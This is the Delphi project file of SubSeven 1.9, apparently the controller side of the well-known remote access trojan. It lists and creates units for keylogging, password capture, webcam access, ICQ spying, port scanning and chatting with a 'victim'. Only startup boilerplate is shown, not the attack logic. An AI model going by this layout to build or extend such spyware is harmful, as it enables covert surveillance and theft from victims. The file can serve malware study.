program Sub7;

uses
  Forms,
  Unit2 in 'Unit2.pas' {Form1},
  ClientsChatUnit in 'ClientsChatUnit.pas' {ClientChat},
  ListaUnit in 'ListaUnit.pas' {Lista},
  dirunit in 'dirunit.pas' {GetFol},
  aboutbox in 'aboutbox.pas' {about},
  npath in 'npath.pas' {GetNewPath},
  showimage in 'showimage.pas' {showimg},
  ShowInformations in 'ShowInformations.pas' {ShowInfo},
  passunit in 'passunit.pas' {pass},
  portscanunit in 'portscanunit.pas' {portscan},
  key_log_unit in 'key_log_unit.pas' {KeyLogUnit},
  ftpservunit in 'ftpservunit.pas' {FTPServer},
  messageunit in 'messageunit.pas' {messagemanager},
  SendKeyUnit in 'SendKeyUnit.pas' {SendKeyForm},
  OptionsUnit in 'OptionsUnit.pas' {OptionsForm},
  flipUnit in 'flipUnit.pas' {flipForm},
  WebCamUnit in 'WebCamUnit.pas' {webcamform},
  readregs in '..\..\..\Program Files\Borland\Delphi4\Projects\reg editor\readregs.pas' {regform},
  waitunit in 'waitunit.pas' {waitform},
  FindUnit in 'FindUnit.pas' {FindForm},
  Unit23 in 'Unit23.pas' {Form3},
  printUnit in 'printUnit.pas' {printForm},
  EmailUnit in 'EmailUnit.pas' {EmailForm},
  ResolutionUnit in 'ResolutionUnit.pas' {ResolutionForm},
  PopKeyHookUnit in 'PopKeyHookUnit.pas' {PopKeyHook},
  VictimChatUnit in 'VictimChatUnit.pas' {VictimChat},
  PickChatUnit in 'PickChatUnit.pas' {PickChatForm},
  SetSoundUnit in 'SetSoundUnit.pas' {SetSoundForm},
  ChangeColorsUnit in 'ChangeColorsUnit.pas' {ChangeColorsForm},
  SkinUnit in 'SkinUnit.pas' {SkinForm},
  TimeDateUnit in 'TimeDateUnit.pas' {TimeDate},
  AboutBox2 in 'AboutBox2.pas' {AboutBox2},
  nonstopUnit in 'nonstopUnit.pas' {nonstopForm},
  ICQSpyUnit in 'ICQSpyUnit.pas' {ICQSpyForm};

{$R *.RES}
var SplashAbout:TAboutBox2;

begin
  Application.Initialize;
  SplashAbout:=TAboutBox2.Create(Application);
  SplashAbout.MakeSplash;
  Application.Title := 'SubSeven';
  Application.CreateForm(TForm1, Form1);
  Application.CreateForm(TICQSpyForm, ICQSpyForm);
  SplashAbout.Label1.Caption:='main form loaded. initiating...';
  Application.CreateForm(TForm3, Form3);
  Application.CreateForm(TGetNewPath, GetNewPath);
  Application.CreateForm(TClientChat, ClientChat);
  Application.CreateForm(TLista, Lista);
  Application.CreateForm(TGetFol, GetFol);
  Application.CreateForm(Tabout, about);
  Application.CreateForm(Tshowimg, showimg);
  Application.CreateForm(TShowInfo, ShowInfo);
  Application.CreateForm(Tpass, pass);
  Application.CreateForm(Tportscan, portscan);
  Application.CreateForm(TKeyLogUnit, KeyLogUnit);
  Application.CreateForm(TFTPServer, FTPServer);
  Application.CreateForm(Tmessagemanager, messagemanager);
  Application.CreateForm(TSendKeyForm, SendKeyForm);
  Application.CreateForm(TOptionsForm, OptionsForm);
  Application.CreateForm(TFindForm, FindForm);
  Application.CreateForm(TflipForm, flipForm);
  Application.CreateForm(Twebcamform, webcamform);
  Application.CreateForm(Tregform, regform);
  Application.CreateForm(Twaitform, waitform);
  Application.CreateForm(TprintForm, printForm);
  Application.CreateForm(TEmailForm, EmailForm);
  Application.CreateForm(TResolutionForm, ResolutionForm);
  Application.CreateForm(TPopKeyHook, PopKeyHook);
  Application.CreateForm(TVictimChat, VictimChat);
  Application.CreateForm(TPickChatForm, PickChatForm);
  Application.CreateForm(TSetSoundForm, SetSoundForm);
  Application.CreateForm(TChangeColorsForm, ChangeColorsForm);
  Application.CreateForm(TSkinForm, SkinForm);
  Application.CreateForm(TTimeDate, TimeDate);
  Application.CreateForm(TnonstopForm, nonstopForm); SplashAbout.Label1.Caption:='SubSeven version 1.9 ready.';
  Application.OnException:=Form1.HandleErrors;
  SplashAbout.Timer1.Enabled:=True;
{  SplashAbout.Free;}
  Application.Run;
end.
